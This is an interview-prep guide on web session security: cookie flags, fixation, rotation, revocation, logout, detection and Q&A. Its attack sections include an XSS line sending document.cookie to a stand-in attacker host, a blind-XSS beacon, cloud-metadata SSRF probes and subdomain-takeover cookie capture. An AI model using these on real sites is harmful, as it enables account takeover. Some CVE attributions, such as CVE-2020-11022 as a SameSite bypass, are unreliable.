# Session Management Deep Dive

> A session is a server's memory that a specific browser has already authenticated, expressed as one bearer secret the browser presents on every request. The root cause of most session bugs is conflating this bearer with the authentication event itself: the login proves who the user is, and the session ID only proves the browser holds that proof. Treat the session ID as capability, not identity: anyone who reads its bytes becomes the user until the server invalidates them. That framing dictates why HttpOnly, Secure, SameSite, fixation rotation, and privilege-change rotation all exist as separate controls. Each closes one specific way the bytes leak or get planted. Everything else in this doc is a corollary.

**Interview frequency:** Common

*See also: [Session Management](101-session-management.md) for the architectural decision on where the session continuity proof lives per surface (web, mobile, service) and how it's revoked.*

## Quick reference

```http
# Server sets an opaque, high-entropy session ID after login.
HTTP/1.1 200 OK
Set-Cookie: __Host-sid=8f3e1c0b9a7d4e2f6c1b5a8d3e7f0912a4b6c8e0d1f2a3b4c5d6e7f809abcdef;
            Path=/; Secure; HttpOnly; SameSite=Lax
Cache-Control: no-store

# Browser echoes the cookie on every same-site request.
GET /account HTTP/1.1
Host: bank.example
Cookie: __Host-sid=8f3e1c0b9a7d4e2f6c1b5a8d3e7f0912a4b6c8e0d1f2a3b4c5d6e7f809abcdef

# Logout: server deletes row AND expires cookie in one response.
HTTP/1.1 200 OK
Set-Cookie: __Host-sid=; Path=/; Secure; HttpOnly; SameSite=Lax;
            Expires=Thu, 01 Jan 1970 00:00:00 GMT
```

| Invariant | Where enforced | How violated | Source |
|---|---|---|---|
| Session ID has >=64 bits of entropy from a CSPRNG | Server session issuer | `md5(user_id.now())`, sequential IDs, `Math.random()` | NIST SP 800-63B rev.3 section 7.1.1 |
| Session ID rotates on every authentication and privilege change | Login handler, step-up handler | Reusing pre-login anonymous ID after login (fixation) | OWASP Session Management Cheat Sheet |
| Cookie carrying session is Secure, HttpOnly, SameSite=Lax or stricter | `Set-Cookie` builder | `Set-Cookie: sid=...;` bare, or JS-readable | RFC 6265bis section 4.1.2, section 5.5 |
| Session store supports server-side revocation in O(1) | Session store schema | Stateless JWT with no jti allowlist/denylist | RFC 7519 section 4.1.7, RFC 7009 |
| Idle timeout and absolute timeout both enforced server-side | Session middleware | Client-side expiry only, or sliding forever | NIST SP 800-63B rev.3 section 7.2 |
| Logout deletes the server-side session record before clearing cookie | Logout handler | Only `Set-Cookie: sid=; Expires=1970` (client-side) | OWASP Session Management Cheat Sheet |
| `__Host-` prefix requires Secure, Path=/, no Domain attribute | Browser cookie parser | Setting `Domain=example.com` breaks the prefix contract | RFC 6265bis section 4.1.3 |
| SSO logout propagates to all RPs via back-channel logout tokens | OP + RPs | Local logout only, other tabs remain authenticated | OpenID Connect Back-Channel Logout 1.0 |

## How it works

A session is a pair: a small opaque identifier held by the browser and a much larger record held by the server. The identifier is the entire capability. Anyone who possesses those bytes and can present them over TLS to the server's origin is that user, up to whatever authorization the server layer enforces on top. The server-side record holds the interesting data: user ID, roles, auth time, MFA state, IP binding if any, CSRF secret, idle deadline, absolute deadline.

### Opaque server-side ID vs signed client-side token

Two designs dominate. The opaque server-side session stores state in a database (Redis, Postgres, Memcached, in-memory map) and hands the browser a random string that indexes the row. Revocation is one `DELETE` statement. Scaling means the store, not the app servers, holds state. The signed or encrypted client-side session (JWT-in-cookie, `express-session` with `cookie-session`, Rails `signed_cookie`, ASP.NET Core `CookieAuthenticationOptions`) serializes the entire session into the cookie itself, authenticated with an HMAC or AEAD. The server holds no state, so revocation requires an allowlist (jti-in-Redis) or a denylist plus short expiry. Cross-link: [13-jwt-token-security.md](./13-jwt-token-security.md).

Neither is universally better. Opaque IDs cost a store lookup per request but revoke instantly. Client-side tokens cost cryptographic verification per request but survive without shared state. Most incidents come from mixing them: a "stateless" JWT session that is actually keyed on a `sid` in Redis anyway, but with no rotation on privilege change, so an attacker who obtains the JWT before MFA still has the post-MFA claims after the user upgrades.

### Cookie attributes: what each flag actually stops

`Secure` prevents transmission over cleartext HTTP. Without it, any network attacker (public WiFi, ISP, compromised BGP peer) reads the session ID as plaintext. `HttpOnly` removes `document.cookie` visibility from JavaScript, so a stored XSS that runs `fetch('//attacker/'+document.cookie)` finds nothing useful. `SameSite=Lax` (default in modern Chromium and Firefox) blocks the cookie on cross-site subresource requests and cross-site POSTs, which is the primary CSRF defense in 2024+. `SameSite=Strict` also blocks top-level navigation, breaking the "click a link from Gmail into your bank and stay logged in" flow. `SameSite=None; Secure` re-enables cross-site sending, required for genuine third-party contexts (embedded widgets, cross-origin auth). `Partitioned` (CHIPS) keys the cookie by top-level site, so `tracker.example` gets a separate jar per embedder site, killing cross-site tracking while allowing legitimate iframe state. Cross-link: [03-csrf.md](./03-csrf.md).

The `__Host-` prefix is a browser-enforced integrity check: any cookie named `__Host-<name>` must be `Secure`, must have `Path=/`, and must not carry a `Domain` attribute. That last condition is what makes it useful. It pins the cookie to the exact origin that set it, so a subdomain (`beta.example.com`, `docs.example.com`) cannot overwrite or shadow the main site's session cookie. `__Secure-` is a weaker version that only requires `Secure`.

### Domain scoping pitfalls

`Set-Cookie: sid=...; Domain=example.com` sends the cookie to `example.com` and every subdomain. If any subdomain is compromised (subdomain takeover, XSS on a marketing microsite, staff phpMyAdmin on `admin-old.example.com`), that subdomain reads and writes the production session. The correct default is no `Domain` attribute at all: the cookie is host-only, scoped to the exact host that set it. Only widen to `Domain=example.com` if the SSO or multi-app requirement actually demands it, and pair it with `__Host-` on the per-app cookies that must stay isolated.

### Session lifecycle

```mermaid
sequenceDiagram
    autonumber
    participant B as Browser
    participant S as Server
    participant DB as Session store

    B->>S: GET /login (anonymous)
    S->>DB: create anon session A
    S-->>B: Set-Cookie: sid=A (pre-auth)
    Note over B: ATTACK SURFACE: fixation planted here if no rotation on login
    B->>S: POST /login {creds} + sid=A
    S->>S: verify credentials
    Note over S,DB: FIXATION FIX: destroy A, mint fresh B
    S->>DB: delete A; create session B (auth=true, mfa=false)
    S-->>B: Set-Cookie: sid=B; Secure; HttpOnly; SameSite=Lax
    Note over B: ATTACK SURFACE: XSS reads sid if HttpOnly missing; MITM reads if Secure missing
    B->>S: POST /mfa/verify + sid=B
    S->>S: verify TOTP
    Note over S,DB: STEP-UP: destroy B, mint fresh C (mfa=true)
    S->>DB: delete B; create session C
    S-->>B: Set-Cookie: sid=C
    B->>S: GET /account + sid=C
    Note over B,S: ATTACK SURFACE: cross-site POST rides sid if SameSite=None or missing
    S->>DB: touch(C).last_seen = now
    Note over S,DB: idle deadline slides forward; absolute deadline does not
    B->>S: POST /logout + sid=C
    S->>DB: delete C
    S-->>B: Set-Cookie: sid=; Expires=1970
    Note over S,DB: ATTACK SURFACE: if only cookie is cleared and DB row lives, replay works
```

Idle timeout (say, 30 minutes of inactivity) protects abandoned sessions on shared machines. Absolute timeout (say, 12 hours from login) protects against long-lived compromise even for active users. Both are cheap to store: two `int8` columns. Sliding-only expiry is a common misconfiguration and effectively means the session never expires as long as anyone (attacker included) keeps using it. NIST SP 800-63B rev.3 AAL2 requires reauthentication at least every 12 hours or after 30 minutes idle<sup>[[1]](#ref1)</sup>.

Concurrent-session policy is a product choice with security tradeoffs. Banks often enforce one active session per user: a new login destroys older sessions. This makes stolen-cookie replay obvious (the real user gets kicked out) at the cost of legitimate multi-device use. Consumer apps typically allow N concurrent sessions and rely on the "active sessions" panel for detection.

### Server-side stores

Single-process memory (`express-session` default `MemoryStore`) is a demo-only choice: it does not survive a restart and it does not scale past one instance. Sticky sessions (load balancer hashes on cookie) work but pin traffic to specific nodes, so a node failure logs out its users. Redis is the default production choice: sub-millisecond `GET`, TTL on the key matches session expiry, `DEL` for revocation. Postgres works for lower-QPS apps and gives transactional consistency with the user table.

Enumeration risk is real. If session IDs are 32 bits, an attacker with 4 billion HTTP requests (achievable on a botnet) can brute-force the space. If they are sequential UUIDs (v1 or v6 timestamp-based), an attacker who has one valid session can predict adjacent ones. NIST SP 800-63B rev.3 section 7.1.1 requires at least 64 bits of entropy for session identifiers<sup>[[1]](#ref1)</sup>; OWASP recommends 128 bits<sup>[[2]](#ref2)</sup>. Use `crypto.randomBytes(32)` (Node), `secrets.token_urlsafe(32)` (Python), `SecureRandom.hex(32)` (Ruby).

### Revocation

For opaque server-side sessions, revocation is trivial: `DELETE FROM sessions WHERE sid = ?`. The next request finds no row and forces login. For stateless tokens (JWT), the token remains cryptographically valid until it expires, so revocation requires state: either a denylist of revoked `jti` values (checked on every request) or an allowlist of valid `jti` values. The denylist grows unbounded unless you scope it by absolute expiry: entries can be evicted after the token would have expired anyway. OAuth 2.0 Token Revocation<sup>[[5]](#ref5)</sup> defines the endpoint pattern for revoking refresh and access tokens against an authorization server; the underlying resource server still needs its own allow or deny check to honor a revocation before token expiry. Cross-link: [13-jwt-token-security.md](./13-jwt-token-security.md).

### Logout

Local logout deletes the session on the current app. Global logout across SSO requires cooperation: OpenID Connect defines Back-Channel Logout<sup>[[6]](#ref6)</sup>, where the OP sends a signed logout token (JWT with `events` claim) to every RP the user has an active session with, and each RP destroys its local session. Front-channel logout (iframes back to the OP) is deprecated because third-party cookie blocking breaks it. Cross-link: [14-oauth-oidc.md](./14-oauth-oidc.md).

## Attack techniques

### 1. Session fixation

The attacker's goal is to know the victim's post-login session ID before the victim logs in. If the server reuses the anonymous session ID after authentication (mints one cookie for the anonymous browser, then just flips an `authenticated=true` flag on the same row), the attacker plants a known ID in the victim's browser first, then waits for the victim to log in.

Concrete flow: attacker visits the target and receives `sid=A`. Attacker crafts a link `https://target.example/set-cookie?sid=A` if a header-injection or query-param-to-cookie sink exists, or uses a subdomain XSS to `document.cookie = 'sid=A; Domain=.example.com'`, or (historically) exploits `Set-Cookie` via a session-URL parameter that older apps supported. Victim clicks, victim logs in, victim's browser sends `sid=A` on the login POST, the server marks session A as authenticated. Attacker, still holding `sid=A`, now has an authenticated session.

To confirm as a black-box tester, log in, note your session cookie value, log out, log in again. If the cookie value is identical, the site does not rotate on login. View the `Set-Cookie` on the login response; absence of a session `Set-Cookie` means no rotation is happening<sup>[[2]](#ref2)</sup>. When the target response is not directly observable (blind fixation via cookie-setting sink on an unauthenticated page), plant a long, unique ID and poll `/account` or `/api/me` from the attacker's context in a loop; the moment the victim authenticates, the polled endpoint transitions from 401 to 200, giving an out-of-band signal without ever seeing the login response.

Escalation lands hard on high-value targets. On admin panels and payment portals fixation converts to full account takeover the moment the victim authenticates. Chained with a subdomain XSS that plants the cookie, the whole thing collapses to a single-click ATO with no further victim interaction, which is the shape reported publicly against Rails apps under CVE-2007-5380 and repeatedly against custom PHP session code since.

### 2. Session hijacking via XSS

Stored or reflected XSS on the same origin as the session cookie is the classic hijack vector. If `HttpOnly` is set, `document.cookie` cannot read the session, so the direct `fetch('//attacker/'+document.cookie)` payload fails. That does not end the game. The XSS still runs in the origin, so it can call authenticated endpoints directly (`fetch('/admin/create-user', {method:'POST', credentials:'include', body:...})`) and exfiltrate the results. Cookie theft is not required for takeover, only for takeover that outlasts the XSS. Cross-link: [02-cross-site-scripting.md](./02-cross-site-scripting.md).

The token-in-localStorage anti-pattern removes even the `HttpOnly` protection. Every SPA tutorial that stores a bearer JWT in `localStorage.setItem('token', jwt)` and reads it back with `Authorization: Bearer ${token}` has traded a cookie (which JS cannot read if HttpOnly) for a string that any script on the page can read. Any XSS, any compromised NPM dep with an install-time postscript, any embedded ad script, any browser extension with `<all_urls>` permission, reads that token and exfiltrates it.

Detecting live XSS in the wild is often blind: the payload fires on an admin's dashboard the attacker cannot see. The standard trick is a blind-XSS beacon (XSS Hunter style) that `fetch`es an attacker-controlled URL with `document.cookie`, `document.URL`, `document.body.innerHTML` prefix, and captured DOM secrets. The beacon lands out-of-band on the attacker's server whenever the payload executes anywhere, hours or days later, and reveals which internal tool rendered the input unsafely. If cookies are HttpOnly the beacon still returns URL, DOM, and any tokens the JS layer holds, which is how the 2018 British Airways Magecart intrusion exfiltrated payment data from within origin despite session cookies being HttpOnly.

Open devtools console and type `document.cookie`; if the session cookie name appears, `HttpOnly` is missing. Type `localStorage` and `sessionStorage`; if either contains something that looks like a JWT (`eyJhbGciOi...`), the app is exposed. Escalation is asymmetric: an XSS that reads a JWT from localStorage yields a bearer credential that works from anywhere until it expires, materially worse than a cookie-based hijack that requires the attacker to replay through the victim's browser or extract before rotation.

### 3. MITM on missing Secure flag

A session cookie without `Secure` is sent on any HTTP request the browser makes to the same host. In coffee-shop WiFi conditions (or on a network with an attacker-in-the-middle, or with a compromised router, or via an SSL-stripping upstream), the attacker forces the browser to make an HTTP request to `http://bank.example/anything` (via a stripped image tag, a downgrade attempt, or a legacy port). The cookie is transmitted in cleartext and stolen.

Modern browsers ship HSTS preload lists and increasingly refuse plain HTTP entirely, but the defense-in-depth is a one-line fix on the server. Capture the initial page load with Burp or `mitmproxy`, look at every `Set-Cookie` header for a session-shaped cookie missing `; Secure`. Where TLS interception is not available (locked-down corporate network, cert-pinned app), the blind confirmation is to trigger an HTTP subresource fetch (e.g., a stale `<img src="http://target.example/pixel.png">` embedded in third-party content) and observe on your own network gear whether the browser attaches the session cookie on the HTTP request, since a Secure cookie will not appear on the wire at all.

Escalation is straightforward on public WiFi: sniff, replay the captured cookie from the attacker's machine. If there is no IP binding (there usually is not, because mobile users roam networks), the session works. Firesheep in 2010 demonstrated this against Facebook, Twitter, and Gmail simultaneously, forcing the industry-wide move to HTTPS-only session cookies.

### 4. Subdomain-scoped cookie replay after subdomain takeover

The session cookie is scoped `Domain=example.com`. Marketing spins up `promo.example.com` on a third-party CMS, points DNS at the vendor, forgets to renew the vendor account. Attacker registers the abandoned name inside the vendor's tenant and now controls `promo.example.com` content. The browser sends `sid=...` to `https://promo.example.com/anything` because of the domain-wide cookie scope. Attacker's server logs the cookie value. Attacker replays against `https://www.example.com/`, becomes the victim.

The `__Host-` prefix is the direct fix: `Set-Cookie: __Host-sid=...; Path=/; Secure; HttpOnly; SameSite=Lax`, with no `Domain` attribute, refuses to be set on any host other than the exact origin, refuses to be widened, and cannot be shadowed by a subdomain. To find the dangling subdomain out-of-band, enumerate DNS with `subfinder` or `amass`, then `dig CNAME` each result and look for records pointing at cloud vendors (Azure Traffic Manager, AWS ElasticBeanstalk, GitHub Pages, Heroku) whose tenants can be claimed. The classic blind confirmation is a DNS-level OOB probe: register the abandoned vendor slot, serve a canary JS payload that beacons back to a collaborator host, wait for real user traffic to hit the taken-over subdomain, and the collaborator log gives you the cookie without any noisy scanner traffic to the main site.

Escalation gives full account takeover for any user who visits the taken-over subdomain, silent and untraceable from the victim's perspective, which is exactly the shape of the widely-reported takeovers against Microsoft, Starbucks, and Shopify vendors between 2017 and 2020.

### 5. CSRF via missing SameSite

A session cookie without `SameSite=Lax` (or stricter) is sent on cross-site requests including forms, XHR with `credentials: 'include'`, and (with `SameSite=None`) subresource loads. Attacker hosts `attacker.com/csrf.html` that auto-submits a form to `bank.example/transfer` with the victim's cookie riding along. Modern browsers default to `Lax` for cookies with no explicit attribute, so the pure-omission version of this attack no longer works out of the box in Chromium and Firefox. Two carve-outs remain: `SameSite=None; Secure` cookies (necessary for genuine third-party contexts) still allow the attack, and the "Lax + POST" grace period some browsers applied for compatibility windows can be exploited during rollouts. Cross-link: [03-csrf.md](./03-csrf.md).

Craft a form on a differently-registered origin, autosubmit to a state-changing endpoint, watch server logs for the mutation. When the response is not directly visible (blind CSRF against a write-only endpoint like "delete account" or "invite user"), pair the attack with an OOB confirmation channel: the newly invited email address is attacker-controlled, so an incoming invite email confirms execution without needing to read the HTTP response. Any state-changing endpoint that trusts only the cookie is vulnerable; combined with JSON-body endpoints that accept `Content-Type: text/plain` or with `<form enctype="text/plain">`, the attack extends to REST APIs previously assumed CSRF-safe, which is how CVE-2020-11022 and similar SameSite-bypass reports escalated against admin panels that had relied on JSON content-type as a CSRF barrier.

### 6. SSRF pivoting via cookie-authenticated internal endpoints

An SSRF primitive on the app server lets the attacker make requests from the server's network position. If the server holds session cookies for its own internal admin panel (say, in a cookie jar in the SSRF-vulnerable HTTP client), or if the internal admin panel binds to `localhost:8080` and trusts requests from `127.0.0.1` without any auth, the SSRF turns into unauthenticated admin. More subtly, some cloud metadata endpoints and internal service meshes accept a Bearer token or session cookie for auth: if the SSRF sink can be steered to include those, the attacker gets sensitive internal responses.

Use collaborator-style OOB detection. Trigger the SSRF sink with `http://collaborator.example`, confirm the request lands. Then probe `http://127.0.0.1:PORT/`, `http://169.254.169.254/latest/meta-data/` (AWS IMDS), `http://metadata.google.internal/` (GCP), `http://[::1]:PORT/`, `http://[0:0:0:0:0:ffff:127.0.0.1]/` for parser confusion. IMDSv1 without hop-limit=1 yields IAM credentials, which convert directly to cross-service compromise, precisely the mechanic of the 2019 Capital One breach where an SSRF on a WAF host retrieved role credentials from IMDS and pivoted to S3. Cross-link: [18-cors.md](./18-cors.md) for related origin-confusion vectors.

## Defense

### Real fix

1. Generate session IDs with a CSPRNG, at least 128 bits of entropy. The invariant: brute-forcing the ID space is computationally infeasible, and every downstream control assumes the ID cannot be guessed or predicted. The mechanism: `crypto.randomBytes(16)` or equivalent, base64url-encoded. Common wrong implementation: `md5(email+timestamp)`, sequential integers, or `Math.random()`-derived IDs, all of which have been used in production and all of which are enumerable or predictable<sup>[[1]](#ref1)</sup>.

2. Rotate the session ID on every authentication event and privilege change. The invariant: no session ID present before the auth step is valid after it. The mechanism: on login success and on any step-up (MFA verified, sudo mode entered, role assumed), destroy the current session record and mint a new one, then set a fresh cookie. This closes fixation entirely because any ID the attacker planted becomes invalid the moment the victim authenticates. Common wrong implementation: flipping `authenticated=true` on the existing row without deleting-and-recreating, which preserves the attacker's known ID<sup>[[2]](#ref2)</sup>.

3. Use `__Host-` prefix, `Secure`, `HttpOnly`, `SameSite=Lax` on every session cookie. The invariant: browser refuses to send the cookie over HTTP, refuses to reveal it to JS, refuses to send it cross-site by default, and refuses to let a subdomain shadow it. The mechanism: browser-enforced parsing rules from RFC 6265bis. Common wrong implementation: setting `Domain=example.com` on the primary session cookie "just in case we need it on subdomains later", which breaks the `__Host-` prefix, widens the blast radius, and enables subdomain-takeover replay<sup>[[3]](#ref3)</sup>.

4. Store sessions server-side with O(1) revocation. The invariant: the server can invalidate a session before the next request. The mechanism: Redis with TTL, Postgres with a covering index on `sid`, or an equivalent. Logout, password change, admin lockout, and detected compromise all issue a single delete. When a stateless JWT session is unavoidable, pair it with a jti allowlist checked on every request, and expose an OAuth 2.0 Token Revocation endpoint for programmatic invalidation<sup>[[4]](#ref4)</sup><sup>[[5]](#ref5)</sup>.

5. Enforce both idle and absolute timeouts server-side. The invariant: sessions cannot live past their absolute deadline, and inactive sessions expire at the idle deadline, regardless of what the client claims. The mechanism: two columns on the session row, checked on every read, refreshed only on legitimate activity. Common wrong implementation: relying on cookie `Max-Age` alone (client can trivially extend), or sliding both timers so the session never dies<sup>[[1]](#ref1)</sup>.

### Defense in depth

1. Do not put bearer tokens in `localStorage` or `sessionStorage`. The invariant: JavaScript should never be able to read the session credential. The mechanism: use an HttpOnly cookie, or if you must use `Authorization: Bearer` (mobile SPA, browser-extension-scoped app), pair with short expiry and refresh-in-cookie. Common wrong implementation: any tutorial that says "store the JWT in localStorage for convenience"<sup>[[2]](#ref2)</sup>.

2. Wire OIDC back-channel logout on the IdP and all RPs. The invariant: logout on one property terminates sessions on every property that trusts the same IdP. The mechanism: OP posts a signed logout token (with `events: {"http://schemas.openid.net/event/backchannel-logout": {}}`) to each RP's `backchannel_logout_uri`; RPs validate the JWT signature and destroy the matching local session. Common wrong implementation: front-channel logout via iframes, which fails silently under third-party cookie blocking<sup>[[6]](#ref6)</sup>.

3. Use a CSRF token bound to the session even with SameSite=Lax. The invariant: state-changing requests require a secret that a cross-site attacker cannot read. The mechanism: double-submit cookie or synchronizer token pattern; SameSite alone is one bug-report away from being bypassed via a browser regression or a partner subdomain. Cross-link: [03-csrf.md](./03-csrf.md).

4. Ship `Partitioned` (CHIPS) on any cookie that must work in third-party contexts. The invariant: the cookie is keyed per top-level site, so a tracker on `siteA.example` cannot see the same jar it saw on `siteB.example`. The mechanism: `Set-Cookie: name=val; Secure; SameSite=None; Partitioned`. Common wrong implementation: relying on `SameSite=None; Secure` alone during the third-party cookie deprecation window, which is being removed by Chromium<sup>[[7]](#ref7)</sup>.

5. Bind session to some coarse client fingerprint (User-Agent family, TLS JA3, or /24 subnet). The invariant: a hijacked cookie replayed from a wildly different environment is rejected. The mechanism: on session mint, record fingerprint; on read, compare with a tolerance that avoids logging users out when they roam. Common wrong implementation: binding to exact IP (breaks mobile users hourly) or exact User-Agent (breaks browser auto-updates). Use loose fingerprints and log mismatches for correlation rather than hard-failing<sup>[[2]](#ref2)</sup>.

6. Log and alert on session anomalies. The invariant: hijack attempts leave detectable signals. The mechanism: log session ID prefix (never the full ID), source IP, User-Agent, referrer, and time; alert on same session ID from two ASNs within 60 seconds, or on a session that was IDLE for hours suddenly hitting sensitive endpoints. See detection section.

## Detection and telemetry

Log a stable hash of the session ID (never the ID itself), source IP, User-Agent hash, TLS fingerprint, and a monotonic request counter. Emit an event on every session mint, rotation, and destruction. Never log the raw session cookie value: it goes into log-aggregator search indexes, gets shipped to third-party log vendors, ends up in incident-response dumps, and each of those becomes a fresh takeover surface.

Alerts worth wiring: same session ID observed from two ASNs within one minute (impossible geographic movement); session accessing sensitive endpoints (`/admin`, `/api/users/*/export`) that has never accessed them before; session that skipped the login rotation (should be flagged as a code bug, not a user event); session that fails idle-timeout check but still has requests coming in (clock drift or replay); ratio of `sid` values that fail lookup rising above baseline (enumeration attack). Correlate with CSRF token failures: a genuine hijack often shows valid session and missing/invalid CSRF token together.

Canary sessions help. Mint dedicated honeytokens that never correspond to a real user; any request bearing one is by construction a replay of stolen state. Rotate these on a fixed schedule so a real attacker's collection window is bounded.

## Interviewer probes

**Q: Why is `HttpOnly` insufficient defense against XSS-driven account takeover?**

Mid: XSS in the origin can still call authenticated endpoints directly using `fetch(..., {credentials: 'include'})` without ever reading `document.cookie`.

Principal: `HttpOnly` prevents cookie exfiltration, which limits the attacker's persistence window to the lifetime of the XSS payload's execution context. It does not stop in-context abuse: the payload can perform any action the logged-in user can perform, including changing password, adding a second factor, or issuing an API token that survives the XSS fix. The real fix is preventing XSS per [02-cross-site-scripting.md](./02-cross-site-scripting.md), with CSP as defense in depth. The British Airways 2018 Magecart intrusion illustrated this shape: attackers injected JS into the payment page and exfiltrated card data via in-context XHR, no cookie theft required, ultimately drawing the ICO's initial £183M GDPR fine.

**Q: When does session fixation still work in 2025?**

Mid: When the app does not rotate the session ID at login, an attacker who plants a known cookie (via subdomain XSS, header injection, or historical URL-parameter session sinks) keeps the same ID after the victim authenticates.

Principal: The direct fixation attack requires a cookie-setting sink, which modern browsers have significantly narrowed. Where it still lives: apps with subdomain XSS on a shared cookie domain, apps with legacy "session parameter in URL" code paths, and apps that use a single sticky identifier across pre-auth and post-auth cart-to-checkout flows. The mitigation is one line: destroy the pre-auth session and mint a new one on login success. Frameworks make it trivial (`request.session.cycle_key()` in Django, `req.session.regenerate()` in Express). CVE-2007-5380 was the canonical Rails fixation case; similar CVEs continue to land against custom PHP session code most years.

**Q: Why would you ever use a JWT-in-cookie session over an opaque server-side session ID?**

Mid: Statelessness. No shared session store needed, so horizontal scaling and multi-region deployments are simpler.

Principal: The honest answer is "usually you should not." Opaque server-side sessions with a Redis backend cost sub-millisecond per request, revoke in O(1), and store arbitrary session state trivially. JWT-in-cookie earns its place in a narrow band: multi-service architectures where the trust boundary spans services that share a signing key but not a session store, or edge/CDN scenarios where the auth decision happens without a round trip. Even there, most teams bolt on a Redis-backed jti allowlist for revocation, at which point they have a stateful session with extra cryptographic overhead. Auth0's own guidance walks readers to this same conclusion, and the 2018 Auth0 alg=none advisory (npm `jsonwebtoken` CVE-2015-9235 lineage) is the standing reminder that JWT verification bugs are their own attack surface. Cross-link: [13-jwt-token-security.md](./13-jwt-token-security.md).

**Q: What does `__Host-` actually protect against that `Secure; HttpOnly` does not?**

Mid: Subdomain shadowing. A malicious or compromised subdomain cannot set a cookie that overrides the main site's session cookie, because `__Host-` forbids the `Domain` attribute.

Principal: `Secure; HttpOnly` protects the cookie in transit and against JS reads, but says nothing about which origin can set it. A subdomain (`beta.example.com`) can normally `Set-Cookie: sid=attacker_value; Domain=example.com; Path=/`, and the browser will attach it to `www.example.com` on the next request, giving session fixation via origin confusion. `__Host-` binds the cookie to the exact host that set it, refuses any `Domain` attribute, and requires `Path=/`. Detectify's 2019 Shopify subdomain-takeover disclosure and the 2017 Microsoft `success.office.com` takeover both mapped directly to this class; had the session cookies been `__Host-` prefixed, the cross-subdomain cookie write would have been refused by the browser<sup>[[3]](#ref3)</sup>.

**Q: A user reports "I logged out of Site A but I'm still logged in on Site B when I go there," and both sites use the same SSO. What went wrong?**

Mid: Site A performed local logout only; SSO back-channel logout is either not configured or not honored by the RPs.

Principal: In an OIDC deployment, logout has three layers: the RP's local session (a cookie on `sitea.example`), the OP's SSO session (a cookie on `sso.example`), and every other RP's local session. Local logout at Site A only kills the first. Global logout requires either RP-Initiated Logout (browser redirect to `end_session_endpoint`) or Back-Channel Logout (server-to-server signed logout tokens the OP posts to each RP's `backchannel_logout_uri`). If Site B was minted from the same SSO session and the OP is not signaling termination, or Site B is not validating the logout token, Site B persists until its own timeout. Okta's 2022 public post-mortem on Lapsus$ specifically called out session-termination gaps across downstream tenants as a hardening priority after the incident. Verify each RP has a registered `backchannel_logout_uri` and validates `iss`, `aud`, `iat`, `jti`, and `events` per the spec<sup>[[6]](#ref6)</sup>. Cross-link: [14-oauth-oidc.md](./14-oauth-oidc.md).

**Q: How much entropy does a session ID need, and why?**

Mid: NIST SP 800-63B rev.3 section 7.1.1 requires at least 64 bits of entropy from a CSPRNG. OWASP recommends 128 bits.

Principal: 64 bits is the NIST hard floor for AAL1 session identifiers, computed against a birthday-bound attacker doing online guessing at server rate limits. 128 bits is the OWASP recommendation and matches typical crypto-primitive strength. The source matters more than the number: `Math.random()` yields around 52 effective bits and is seeded predictably (Chrome V8's XorShift128+ was directly reverse-engineered in 2015 research, allowing prediction from a small sample), `uuid.v1` is timestamp-based and enumerable given one valid ID, and `md5(user_id + secret)` yields at most log2(userspace) bits from an attacker's model. Use a documented CSPRNG (`crypto.randomBytes`, `secrets.token_urlsafe`, `SecureRandom.hex`) and never truncate below 128 bits<sup>[[1]](#ref1)</sup>.

**Q: Design a concurrent-session policy for a consumer app that wants "one active session per user" for security-sensitive accounts and "unlimited" for regular accounts.**

Mid: Store an `active_sessions` list on the user; on new login for security-sensitive accounts, delete all others; expose an "active sessions" UI for regular accounts.

Principal: The design choice is which side pays the cost. Server-side enforcement checks the account tier at mint time and either deletes older rows (single-session) or does not (multi-session). Session-side enforcement re-fetches the user's tier on every request, which is expensive and race-prone; prefer server-side. Under sliding expiry, "active" is bounded by the idle timeout, so "unlimited" is not actually unbounded. The design pitfall (visible in the Google Workspace admin console history, which shipped a strict one-session mode and later relaxed it after admin complaints) is that a literal single-global-session policy drives users to write down passwords or share credentials to work across phone and laptop. The correct target is usually "one session per device family" with device binding on mint. Cross-link: [12-authentication-session.md](./12-authentication-session.md).

## Sources

<a id="ref1"></a>[1] NIST SP 800-63B rev.3. Digital Identity Guidelines: Authentication and Lifecycle Management. National Institute of Standards and Technology. June 2017 (errata 2020). https://pages.nist.gov/800-63-3/sp800-63b.html

<a id="ref2"></a>[2] OWASP Session Management Cheat Sheet. OWASP Foundation. 2024. https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html

<a id="ref3"></a>[3] RFC 6265bis: Cookies: HTTP State Management Mechanism (draft-ietf-httpbis-rfc6265bis). IETF. 2024. https://datatracker.ietf.org/doc/draft-ietf-httpbis-rfc6265bis/

<a id="ref4"></a>[4] RFC 7519: JSON Web Token (JWT). IETF. 2015. https://datatracker.ietf.org/doc/html/rfc7519

<a id="ref5"></a>[5] RFC 7009: OAuth 2.0 Token Revocation. IETF. 2013. https://datatracker.ietf.org/doc/html/rfc7009

<a id="ref6"></a>[6] OpenID Connect Back-Channel Logout 1.0. OpenID Foundation. 2022. https://openid.net/specs/openid-connect-backchannel-1_0.html

<a id="ref7"></a>[7] Cookies Having Independent Partitioned State (CHIPS). IETF HTTP Working Group draft. 2024. https://datatracker.ietf.org/doc/draft-cutler-httpbis-partitioned-cookies/
